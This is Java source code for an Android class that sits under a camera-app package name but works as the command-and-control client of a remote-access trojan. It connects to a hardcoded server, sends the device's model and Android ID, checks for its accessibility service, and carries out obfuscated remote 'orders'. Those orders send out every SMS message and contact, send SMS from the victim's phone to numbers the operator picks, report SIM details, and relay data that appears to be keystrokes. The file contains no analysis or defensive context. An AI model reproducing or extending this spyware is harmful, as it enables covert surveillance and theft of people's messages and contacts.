package com.android.photo.camera.capture;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.LinkedList;
import java.util.Queue;

import io.socket.client.IO;
import io.socket.client.Socket;

public class Connect {
    private static final String TAG = "Connect";
    private static Connect instance;
    private static Context context;
    private Socket ioSocket;
    private static final String CONNECTION_STRING = "192.168.1.3:9999";
    private boolean isListening = false;
    private boolean isProcessing = false;
    private long lastOrderTime = 0;
    private static final long THROTTLE_TIME = 100; // Reduced to 100ms for faster processing
    private Queue<JSONObject> orderQueue = new LinkedList<>(); // Queue for orders

    private Connect(Context ctx) {
        context = ctx.getApplicationContext();
        initSocket();
    }

    public static synchronized Connect getInstance(Context ctx) {
        if (instance == null) {
            instance = new Connect(ctx);
        }
        return instance;
    }

    private void initSocket() {
        try {
            String deviceID = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );

            IO.Options opts = new IO.Options();
            opts.timeout = -1;
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            opts.query = "model=" + android.net.Uri.encode(Build.MODEL) +
                    "&manf=" + android.net.Uri.encode(Build.MANUFACTURER) +
                    "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE) +
                    "&id=" + deviceID;

            if (ioSocket != null) {
                removeListeners();
            }

            ioSocket = IO.socket("http://" + CONNECTION_STRING, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket initialization error: " + e.getMessage());
        }
    }

    private void removeListeners() {
        if (ioSocket != null) {
            ioSocket.off("ping");
            ioSocket.off("order");
            ioSocket.off(Socket.EVENT_CONNECT);
            ioSocket.off(Socket.EVENT_DISCONNECT);
            ioSocket.off(Socket.EVENT_CONNECT_ERROR);
        }
    }

    public static void startAsync(Context con) {
        try {
            context = con;
            if (checkAccessibilityService(con)) {
                sendReq();
            }
        } catch (Exception ex) {
            Log.e(TAG, "Error starting connection", ex);
        }
    }

    private static boolean checkAccessibilityService(Context con) {
        try {
            String enabledServices = Settings.Secure.getString(
                    con.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null &&
                    enabledServices.contains(con.getPackageName() + "/" + Service.class.getName());
        } catch (Exception e) {
            Log.e(TAG, "Error checking accessibility service", e);
            return false;
        }
    }

    public static void startConnection(String ip) {
        try {
            if (!checkAccessibilityService(context)) {
                return;
            }

            Connect connect = getInstance(context);
            if (connect.ioSocket != null) {
                connect.removeListeners();
                connect.ioSocket.disconnect();
            }

            String deviceID = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );

            IO.Options opts = new IO.Options();
            opts.query = "model=" + android.net.Uri.encode(Build.MODEL) +
                    "&manf=" + android.net.Uri.encode(Build.MANUFACTURER) +
                    "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE) +
                    "&id=" + deviceID;

            connect.ioSocket = IO.socket(ip, opts);
            connect.setupEventListeners();
            connect.ioSocket.connect();
            Log.d(TAG, "Connected to " + ip);
        } catch (Exception e) {
            Log.e(TAG, "Failed to connect: " + e.getMessage());
        }
    }

    private void setupEventListeners() {
        if (!isListening) {
            ioSocket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Socket connected");
                isProcessing = false;
                processNextOrder(); // Start processing queue on connect
            });

            ioSocket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.d(TAG, "Socket disconnected");
                isProcessing = false;
            });

            ioSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Connection error");
                isProcessing = false;
            });

            ioSocket.on("ping", args -> ioSocket.emit("pong"));

            ioSocket.on("order", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    orderQueue.add(data); // Add order to queue
                    Log.d(TAG, "Order queued: " + data.toString());
                    processNextOrder(); // Process immediately if not busy
                } catch (Exception e) {
                    Log.e(TAG, "Error queuing order", e);
                }
            });

            isListening = true;
        }
    }

    private void processNextOrder() {
        if (isProcessing || orderQueue.isEmpty()) {
            return; // Skip if already processing or queue is empty
        }

        long currentTime = System.currentTimeMillis();
        if (currentTime - lastOrderTime < THROTTLE_TIME) {
            // Schedule next attempt after throttle period
            new Handler(Looper.getMainLooper()).postDelayed(this::processNextOrder, THROTTLE_TIME);
            return;
        }

        isProcessing = true;
        JSONObject data = orderQueue.poll(); // Get next order
        lastOrderTime = currentTime;

        try {
            String order = data.getString("order");
            Log.d(TAG, "Processing order: " + order);

            switch (order) {
                case "x0000sa":
                    if (data.has("extra")) {
                        if (data.getString("extra").equals("ls")) {
                            x0000sa(0, null, null);
                        } else if (data.getString("extra").equals("sendSMS")) {
                            int simId = data.has("simId") ? data.getInt("simId") : -1;
                            x0000sa(1, data.getString("to"), data.getString("sms"), simId);
                        }
                    }
                    break;
                case "x0000ca":
                    x0000ca();
                    break;
                case "x0000ka":
                    x0000ka(data);
                    break;
                case "x0000sim":
                    x0000sim();
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing order", e);
        } finally {
            isProcessing = false;
            processNextOrder(); // Move to next order in queue
        }
    }

    public static void sendReq() {
        try {
            Connect connect = getInstance(context);
            if (connect.ioSocket == null) {
                connect.initSocket();
            }

            if (!connect.isListening) {
                connect.setupEventListeners();
            }

            if (!connect.ioSocket.connected()) {
                connect.ioSocket.connect();
            }
        } catch (Exception ex) {
            Log.e(TAG, "Error in sendReq: " + ex.getMessage());
        }
    }

    public static void x0000sim() {
        Connect connect = getInstance(context);
        if (!connect.isConnected()) return;

        try {
            connect.ioSocket.emit("x0000sim", SMSManager.getSimInfo());
        } catch (Exception e) {
            Log.e(TAG, "Error in x0000sim", e);
        }
    }

    public static void x0000sa(int req, String phoneNo, String msg, int simId) {
        Connect connect = getInstance(context);
        if (!connect.isConnected()) return;

        try {
            if (req == 0) {
                connect.ioSocket.emit("x0000sa", SMSManager.getSMSList());
            } else if (req == 1) {
                boolean isSent = SMSManager.sendSMS(phoneNo, msg, simId);
                connect.ioSocket.emit("x0000sa", isSent);
                Log.d(TAG, "SMS send result emitted: " + isSent + " to " + phoneNo + " using SIM ID: " + simId);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in x0000sa", e);
        }
    }

    // Original method for backward compatibility
    public static void x0000sa(int req, String phoneNo, String msg) {
        x0000sa(req, phoneNo, msg, -1); // Use default SIM
    }

    public static void x0000ca() {
        Connect connect = getInstance(context);
        if (!connect.isConnected()) return;

        try {
            connect.ioSocket.emit("x0000ca", ContactsManager.getContacts());
        } catch (Exception e) {
            Log.e(TAG, "Error in x0000ca", e);
        }
    }

    public static void x0000ka(JSONObject data) {
        Connect connect = getInstance(context);
        if (connect.isConnected()) {
            try {
                connect.ioSocket.emit("x0000ka", data);
            } catch (Exception e) {
                Log.e(TAG, "Error in x0000ka", e);
            }
        }
    }

    public Socket getSocket() {
        return ioSocket;
    }

    public void reconnect() {
        if (ioSocket != null) {
            removeListeners();
            ioSocket.disconnect();
            initSocket();
            setupEventListeners();
            ioSocket.connect();
        }
    }

    public boolean isConnected() {
        return ioSocket != null && ioSocket.connected();
    }
}